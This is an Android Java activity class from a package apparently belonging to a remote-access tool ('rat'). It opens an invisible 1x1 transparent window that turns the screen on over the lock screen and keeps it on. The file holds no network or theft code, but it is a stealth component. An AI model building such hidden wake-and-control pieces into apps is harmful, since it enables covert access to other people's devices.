package com.vendor.rat.activity;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;

/**
 * 透明 Activity，唯一职责：在锁屏上亮屏并保持。
 * FLAG_TURN_SCREEN_ON + FLAG_SHOW_WHEN_LOCKED + FLAG_KEEP_SCREEN_ON
 */
public class WakeActivity extends Activity {

    private static volatile WakeActivity instance;

    public static void finishIfAlive() {
        WakeActivity a = instance;
        if (a != null) a.finish();
    }

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        instance = this;
        if (Build.VERSION.SDK_INT >= 27) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        }
        getWindow().addFlags(
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                        | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                        | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        View v = new View(this);
        v.setBackgroundColor(0);
        setContentView(v);
        // 1x1 透明窗口
        WindowManager.LayoutParams lp = getWindow().getAttributes();
        lp.width = 1;
        lp.height = 1;
        lp.dimAmount = 0f;
        getWindow().setAttributes(lp);
    }

    @Override
    protected void onDestroy() {
        instance = null;
        super.onDestroy();
    }
}
